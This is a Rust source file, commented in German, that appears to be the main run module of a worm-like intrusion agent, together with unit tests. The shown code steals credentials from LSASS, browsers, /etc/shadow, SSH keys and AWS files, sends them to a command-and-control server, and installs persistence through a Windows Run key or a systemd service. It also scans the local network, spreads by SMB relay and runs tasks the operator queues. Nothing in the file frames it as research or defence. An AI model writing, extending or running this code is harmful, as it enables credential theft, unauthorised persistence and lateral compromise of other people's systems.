//! Der Lauf eines Agenten: Anmeldung, Beute, Persistenz, Entdeckung,
//! Propagation, Tasks.
//!
//! Vorher lag der Ablauf in einer Funktion im Einstiegspunkt: rund 180
//! Zeilen, die sechs Verantwortungen trugen. Sie war der verbindungsstärkste
//! Knoten im Code-Graph und ohne Test — der Baum hatte keinen Seam, der sich
//! ersetzen ließ.
//!
//! Jetzt liegt die **Reihenfolge** hier. Das Modul besitzt sie, nicht der
//! Einstiegspunkt: erst die eigene Beute melden, dann die Persistenz
//! installieren, dann das Netz absuchen, dann die Funde melden, dann die
//! Tasks abarbeiten.
//!
//! Die Abhängigkeiten werden hineingereicht, nicht hier erzeugt: der
//! C2-Port, der Schlüsselvorrat, die Umgebung, die Argumente. Damit lässt
//! sich ein Lauf prüfen — ohne Server, ohne Netz und ohne Dateisystem.

use std::path::PathBuf;

use kx_core::c2::STATUS_AGENT;
use kx_core::persist::Invocation;
use kx_core::secret::Secret;
use kx_scanner::DiscoveredHost;
use tracing::{error, info, warn};

use crate::c2::C2Port;
use crate::hostkey::KeySealer;
use crate::meldung::{self, Ergebnis, HostFund};
use crate::tasks;
use crate::Args;

/// Der Seam der Umgebung: alles, was der Lauf anfasst, das nicht der C2 ist.
///
/// Im Betrieb bindet er die Extraktoren des Systems (Windows, POSIX), die
/// Angriffe im Netz und die Persistenz. Im Test liefert er feste Stücke und
/// tut sonst nichts.
///
/// Zwei Adapter stehen dahinter — der Seam ist damit real, nicht hypothetisch.
#[allow(async_fn_in_trait)]
pub trait Umgebung {
    /// Die Stücke, die auf diesem Host liegen — und die Quellen, die nicht
    /// lesbar waren.
    async fn lokale_beute(&self) -> LokaleBeute;

    /// Die Funde der Netzwerkphase — je Host ein Fund.
    async fn funde_im_netz(&self, entdeckt: &[DiscoveredHost], relay_script: &str)
        -> Vec<HostFund>;

    /// Installiert die Persistenz, damit der Agent einen Neustart überlebt.
    async fn install_persistenz(&self, invocation: &Invocation) -> Result<(), String>;
}

/// Die Umgebung des Systems: die Extraktoren des Hosts, die Angriffe im Netz
/// und die Persistenz.
pub struct System;

impl Umgebung for System {
    async fn lokale_beute(&self) -> LokaleBeute {
        sammle_lokale_beute().await
    }

    async fn funde_im_netz(
        &self,
        entdeckt: &[DiscoveredHost],
        relay_script: &str,
    ) -> Vec<HostFund> {
        crate::propagate::run_propagation(entdeckt, relay_script).await
    }

    async fn install_persistenz(&self, invocation: &Invocation) -> Result<(), String> {
        // Kein Dienst: der Agent meldet sich beim Start nie beim Service
        // Control Manager, der bricht nach 30 Sekunden mit "FAILED 1053" ab.
        // Der Run-Key startet ihn bei jeder Anmeldung.
        #[cfg(target_os = "windows")]
        {
            kx_win::install_run_key(invocation)
                .await
                .map_err(|e| e.to_string())
        }
        #[cfg(unix)]
        {
            kx_posix::install_systemd_service(invocation)
                .await
                .map_err(|e| e.to_string())
        }
    }
}

/// Der Lauf eines Agenten.
///
/// Der Ablauf hat eine Reihenfolge, und die gehört hierher: erst die eigene
/// Beute melden, dann die Persistenz installieren, dann das Netz absuchen,
/// dann die Funde melden, dann die Tasks abarbeiten.
///
/// Die Abhängigkeiten werden hineingereicht, nicht hier erzeugt.
pub struct Lauf<'a, U: Umgebung> {
    args: &'a Args,
    port: &'a dyn C2Port,
    sealer: Option<&'a KeySealer>,
    umgebung: &'a U,
}

impl<'a, U: Umgebung> Lauf<'a, U> {
    /// Ein Lauf mit seinen Abhängigkeiten.
    pub fn new(
        args: &'a Args,
        port: &'a dyn C2Port,
        sealer: Option<&'a KeySealer>,
        umgebung: &'a U,
    ) -> Self {
        Lauf {
            args,
            port,
            sealer,
            umgebung,
        }
    }

    /// Der Lauf beginnt.
    ///
    /// Liefert das Ergebnis der Meldungen: was registriert, gemeldet und
    /// verloren ging. Ob der Lauf als Fehlschlag zu melden ist, entscheidet
    /// das Ergebnis selbst — siehe [`Ergebnis::fehlgeschlagen`].
    pub async fn start(&self) -> Ergebnis {
        let host_id = self.host_kennung();

        // 1. Die eigene Beute sammeln und zusammen mit dem eigenen Host
        //    melden. Der Host kommt zuerst: ohne ihn ist die Beute wertlos.
        let lokale = self.umgebung.lokale_beute().await;
        // Die Quellen, die nicht lesbar waren, gehoeren in die Meldung. Ohne
        // sie haelt der Operator ein Ziel fuer vollstaendig ausgelesen, das es
        // nicht ist.
        for grund in &lokale.fehler {
            warn!("Lokale Beute nicht extrahierbar — {grund}");
        }
        let eigener_fund = HostFund {
            host_id: host_id.clone(),
            ip: host_id.clone(),
            os: None,
            status: STATUS_AGENT.to_string(),
            secrets: lokale.stuecke,
        };
        let mut ergebnis = meldung::melde(self.port, self.sealer, &[eigener_fund]);
        ergebnis.beute_nicht_extrahiert = lokale.fehler.len();

        // 2. Persistenz installieren.
        match self.install_persistenz().await {
            Ok(()) => info!("Persistenz installiert"),
            Err(e) => error!("Persistenz-Installation fehlgeschlagen: {e}"),
        }

        // 3. Netzwerk-Phase: Entdeckung → Scan → Exploit.
        let entdeckt = self.entdecken().await;
        let relay_script =
            resolve_relay_script(&self.args.relay_script, binary_verzeichnis().as_deref());
        let funde = self
            .umgebung
            .funde_im_netz(&entdeckt, &relay_script.to_string_lossy())
            .await;

        // 4. Die Funde melden — je Host zuerst der Host, dann seine Beute.
        ergebnis = ergebnis.zusammenfuehren(meldung::melde(self.port, self.sealer, &funde));

        // 5. Offene Tasks ausfuehren. Der Operator hat die Auftraege ueber
        //    `POST /api/tasks/new` angelegt; der Agent holt sie,
        //    fuehrt sie aus und meldet das Ergebnis zurueck.
        match tasks::run_pending_tasks(self.port, &host_id).await {
            Ok(count) => info!("{count} Tasks ausgefuehrt"),
            Err(e) => error!("Task-Abholung fehlgeschlagen: {e}"),
        }

        ergebnis
    }

    /// Die Host-Kennung des Agenten: seine eigene IP.
    ///
    /// Sie ist stabiler als eine PID und zeigt auf einen Host, den der
    /// C2-Server kennt.
    fn host_kennung(&self) -> String {
        self.args.own_ip.to_string()
    }

    /// Installiert die Persistenz mit der Invocation, die der Agent selbst
    /// benutzt — die Flag-Liste steht an einer Stelle, in
    /// [`Args::persistence_invocation`].
    async fn install_persistenz(&self) -> Result<(), String> {
        let exe = std::env::current_exe().map_err(|e| e.to_string())?;
        let invocation = self.args.persistence_invocation(exe);
        self.umgebung.install_persistenz(&invocation).await
    }

    /// Die Hosts im Netz: der ARP-Sweep, sonst der abgeklopfte Bereich.
    async fn entdecken(&self) -> Vec<DiscoveredHost> {
        if let Some(hosts) = &self.args.hosts {
            info!("Nutze vorgegebene Host-Liste");
            return hosts
                .iter()
                .map(|ip| DiscoveredHost {
                    mac: [0; 6],
                    ip: (*ip).into(),
                })
                .collect();
        }

        let range_start = self.args.start;
        let range_end = self.args.end;
        let own_ip = self.args.own_ip;

        // Die eigene MAC kommt vom Interface: der ARP-Sweep nennt sie als
        // Absender. Eine Anfrage von 00:00:00:00:00:00 beantwortet keine
        // Gegenstelle - sie kennt die Absender-IP schon und wartet auf die
        // MAC, die sie im Cache hat.
        match kx_scanner::read_mac(&self.args.iface)
            .ok_or_else(|| "MAC des Interfaces nicht lesbar".to_string())
            .and_then(|own_mac| {
                kx_scanner::arp_sweep(
                    &self.args.iface,
                    &range_start,
                    &range_end,
                    &own_ip,
                    &own_mac,
                )
                .map_err(|e| e.to_string())
            }) {
            Ok(h) => h,
            Err(grund) => {
                // Ohne ARP (Windows, macOS ohne CAP_NET_RAW) fragt der Agent
                // das Netz nicht ab, sondern klopft den Bereich ab: der
                // TCP-Scan in der Propagation entscheidet, wer antwortet.
                info!("ARP-Sweep nicht verfuegbar ({grund}) — Bereich wird abgeklopft");
                if kx_scanner::bereich_ist_zu_gross(range_start, range_end) {
                    warn!(
                        "Bereich {range_start} bis {range_end} ist zu gross — \
                         nur die ersten {} Adressen werden abgeklopft",
                        kx_scanner::range::MAX_BEREICH
                    );
                }
                kx_scanner::ip_range(range_start, range_end)
                    .into_iter()
                    .map(|ip| DiscoveredHost {
                        mac: [0; 6],
                        ip: ip.into(),
                    })
                    .collect()
            }
        }
    }
}

/// Extrahiert Secrets vom lokalen Host (Windows oder POSIX).
///
/// Die Extraktoren liefern dieselbe Form (`kx_core::secret::Secret`), deshalb
/// ist der Weg von der Extraktion zum Upload eine Schleife statt vier
/// kopierter Blöcke. Die Quelle des Stücks steht im Secret — sie kommt vom
/// Extraktor, der sie am besten kennt.
///
/// Das Ergebnis der Sammlung: die gefundenen Stücke und die Quellen, die
/// fehlgeschlagen sind.
///
/// Beides gehört zusammen: ein verschluckter Fehler lässt den Operator ein
/// Ziel für vollständig ausgelesen halten, das es nicht ist.
#[derive(Debug, Default)]
pub struct LokaleBeute {
    /// Die Stücke, die gefunden wurden.
    pub stuecke: Vec<Secret>,
    /// Die Quellen, die nicht lesbar waren — mit dem Grund.
    pub fehler: Vec<String>,
}

/// Das Versiegeln und das Melden liegen nicht hier, sondern im Modul
/// [`meldung`]: der Master-Key gehört zum Host, und der Fund — nicht das
/// einzelne Stück — ist die Einheit, die gemeldet wird.
async fn sammle_lokale_beute() -> LokaleBeute {
    let mut beute = LokaleBeute::default();
    #[cfg(target_os = "windows")]
    {
        sammle(&mut beute, "LSASS", kx_win::extract_lsass().await);
        sammle(
            &mut beute,
            "Credential Manager",
            kx_win::extract_credential_manager().await,
        );
        sammle(
            &mut beute,
            "Browser-Credentials",
            kx_win::extract_browser_credentials().await,
        );
    }
    #[cfg(unix)]
    {
        sammle(
            &mut beute,
            "/etc/shadow",
            kx_posix::extract_shadow_hashes().await,
        );
        sammle(
            &mut beute,
            "SSH-Schluessel",
            kx_posix::extract_ssh_keys().await,
        );
        sammle(
            &mut beute,
            "AWS-Credentials",
            kx_posix::extract_aws_credentials().await,
        );
    }
    beute
}

/// Nimmt das Ergebnis einer Quelle entgegen — Stücke oder den Grund des
/// Fehlschlags.
///
/// Ein fehlgeschlagener Extraktor ist kein Grund, den Fund zu verwerfen: die
/// anderen Quellen liefern vielleicht mehr. Der Fehler wird aber **nicht**
/// verschluckt — er kommt in die Meldung.
fn sammle<E: std::fmt::Display>(
    beute: &mut LokaleBeute,
    quelle: &str,
    ergebnis: Result<Vec<Secret>, E>,
) {
    match ergebnis {
        Ok(stuecke) => beute.stuecke.extend(stuecke),
        Err(grund) => beute.fehler.push(format!("{quelle}: {grund}")),
    }
}

/// Löst den Pfad des Relay-Skripts auf.
///
/// Ein relativer Pfad wird zuerst **neben dem Binary** gesucht — dort liegt
/// das Asset im Betrieb (`<binary-verzeichnis>/assets/smbrelayx.py`). Findet
/// sich dort nichts, bleibt der relative Pfad stehen; er löst sich dann gegen
/// das Arbeitsverzeichnis des Prozesses auf.
///
/// `basis` ist das Verzeichnis, in dem gesucht wird: das Verzeichnis des
/// Binaries, nicht das Arbeitsverzeichnis.
pub(crate) fn resolve_relay_script(script: &str, basis: Option<&std::path::Path>) -> PathBuf {
    let kandidat = PathBuf::from(script);
    if kandidat.is_absolute() {
        return kandidat;
    }
    if let Some(basis) = basis {
        let neben_dem_binary = basis.join(&kandidat);
        if neben_dem_binary.exists() {
            return neben_dem_binary;
        }
    }
    kandidat
}

/// Das Verzeichnis, in dem das Binary liegt.
///
/// `current_exe` löst Symlinks auf — der Pfad zeigt damit auf die Stelle, an
/// der das Binary wirklich liegt, nicht auf einen Symlink im `PATH`.
fn binary_verzeichnis() -> Option<PathBuf> {
    std::env::current_exe()
        .ok()
        .and_then(|exe| exe.parent().map(|dir| dir.to_path_buf()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::c2::C2Port;
    use kx_core::c2::transport::TransportError;
    use kx_core::c2::{RegisterRequest, SecretUpload, Task, TaskResultRequest};
    use std::sync::Mutex;

    /// Ein Aufzeichner für den C2-Zugriff.
    struct Aufzeichner {
        aufrufe: Mutex<Vec<String>>,
    }

    impl C2Port for Aufzeichner {
        fn registriere_host(&self, req: &RegisterRequest) -> Result<(), TransportError> {
            self.aufrufe
                .lock()
                .unwrap()
                .push(format!("host:{}", req.host_id));
            Ok(())
        }

        fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError> {
            self.aufrufe
                .lock()
                .unwrap()
                .push(format!("beute:{}", upload.host_id));
            Ok(())
        }

        fn hole_tasks(&self) -> Result<Vec<Task>, TransportError> {
            Ok(Vec::new())
        }

        fn melde_task_ergebnis(&self, _report: &TaskResultRequest) -> Result<(), TransportError> {
            Ok(())
        }
    }

    /// Eine Umgebung, bei der eine Quelle nicht lesbar war.
    struct KaputteUmgebung;

    impl Umgebung for KaputteUmgebung {
        async fn lokale_beute(&self) -> LokaleBeute {
            LokaleBeute {
                stuecke: vec![Secret::new("shadow", "root", "hash", "/etc/shadow")],
                fehler: vec!["LSASS: Zugriff verweigert".into()],
            }
        }

        async fn funde_im_netz(
            &self,
            _entdeckt: &[DiscoveredHost],
            _relay_script: &str,
        ) -> Vec<HostFund> {
            Vec::new()
        }

        async fn install_persistenz(&self, _invocation: &Invocation) -> Result<(), String> {
            Ok(())
        }
    }

    /// Eine Umgebung, die feste Funde liefert und sonst nichts tut.
    ///
    /// Damit läuft der ganze Ablauf ohne Server, ohne Netz und ohne
    /// Dateisystem — genau das war vorher nicht möglich.
    struct Attrappe;

    impl Umgebung for Attrappe {
        async fn lokale_beute(&self) -> LokaleBeute {
            LokaleBeute {
                stuecke: vec![Secret::new("shadow", "root", "hash", "/etc/shadow")],
                fehler: Vec::new(),
            }
        }

        async fn funde_im_netz(
            &self,
            _entdeckt: &[DiscoveredHost],
            _relay_script: &str,
        ) -> Vec<HostFund> {
            vec![HostFund {
                host_id: "10.0.0.5".into(),
                ip: "10.0.0.5".into(),
                os: Some("Linux".into()),
                status: kx_core::c2::STATUS_COMPROMISED.to_string(),
                secrets: vec![Secret::new("password", "root", "pw", "default_creds")],
            }]
        }

        async fn install_persistenz(&self, _invocation: &Invocation) -> Result<(), String> {
            Ok(())
        }
    }

    fn args() -> Args {
        Args {
            server: "https://127.0.0.1:8443".into(),
            token: crate::Secret::from("geheim"),
            iface: "eth0".into(),
            start: "192.168.1.1".parse().unwrap(),
            end: "192.168.1.10".parse().unwrap(),
            own_ip: "192.168.1.100".parse().unwrap(),
            // Eine vorgegebene Host-Liste umgeht den ARP-Sweep — der Test
            // fasst das Netz nicht an.
            hosts: Some(vec!["192.168.1.5".parse().unwrap()]),
            relay_script: "assets/smbrelayx.py".into(),
            server_cert: "/tmp/kx-server.crt".into(),
            server_key: None,
        }
    }

    /// Der Lauf meldet erst den eigenen Host mit seiner Beute, dann die Funde
    /// der Netzwerkphase — je Host wieder zuerst der Host.
    #[tokio::test]
    async fn der_lauf_meldet_erst_den_host_dann_seine_beute() {
        let port = Aufzeichner {
            aufrufe: Mutex::new(Vec::new()),
        };
        let umgebung = Attrappe;
        let args = args();
        let lauf = Lauf::new(&args, &port, None, &umgebung);
        let ergebnis = lauf.start().await;

        assert_eq!(
            *port.aufrufe.lock().unwrap(),
            vec![
                "host:192.168.1.100",
                "beute:192.168.1.100",
                "host:10.0.0.5",
                "beute:10.0.0.5",
            ]
        );
        assert_eq!(ergebnis.hosts_registriert, 2);
        assert_eq!(ergebnis.beute_uebertragen, 2);
        assert_eq!(ergebnis.beute_verloren, 0);
        assert!(!ergebnis.fehlgeschlagen());
    }

    /// Der Relay-Pfad wird **neben dem Binary** gesucht — dort liegt das Asset
    /// im Betrieb.
    #[test]
    fn der_relay_pfad_wird_neben_dem_binary_gesucht() {
        let dir = std::env::temp_dir().join(format!("kx-relay-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).expect("Verzeichnis");
        std::fs::create_dir_all(dir.join("assets")).expect("Verzeichnis");
        std::fs::write(dir.join("assets/smbrelayx.py"), "#!/bin/sh\n").expect("Datei");

        let gefunden = resolve_relay_script("assets/smbrelayx.py", Some(dir.as_path()));
        assert_eq!(gefunden, dir.join("assets/smbrelayx.py"));

        std::fs::remove_dir_all(&dir).ok();
    }

    /// Ohne Asset neben dem Binary bleibt der relative Pfad stehen — er löst
    /// sich dann gegen das Arbeitsverzeichnis des Prozesses auf.
    #[test]
    fn ohne_asset_neben_dem_binary_bleibt_der_relative_pfad() {
        let dir = std::env::temp_dir().join(format!("kx-relay-leer-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).expect("Verzeichnis");

        let gefunden = resolve_relay_script("assets/smbrelayx.py", Some(dir.as_path()));
        assert_eq!(gefunden, PathBuf::from("assets/smbrelayx.py"));

        std::fs::remove_dir_all(&dir).ok();
    }

    /// Eine Quelle, die nicht lesbar war, erscheint in der Meldung.
    ///
    /// Vorher verschwand der Fehler: der Extraktor lieferte `unwrap_or_default()`,
    /// der Lauf meldete „0 verloren" — und der Operator hielt ein Target fuer
    /// vollstaendig ausgelesen, das es nicht war.
    #[tokio::test]
    async fn eine_nicht_lesbare_quelle_erscheint_in_der_meldung() {
        let port = Aufzeichner {
            aufrufe: Mutex::new(Vec::new()),
        };
        let umgebung = KaputteUmgebung;
        let args = args();
        let lauf = Lauf::new(&args, &port, None, &umgebung);
        let ergebnis = lauf.start().await;
        assert_eq!(
            ergebnis.beute_nicht_extrahiert, 1,
            "der Fehler ist verschwunden"
        );
        assert_eq!(ergebnis.beute_uebertragen, 1, "die lesbaren Stuecke fehlen");
    }
}
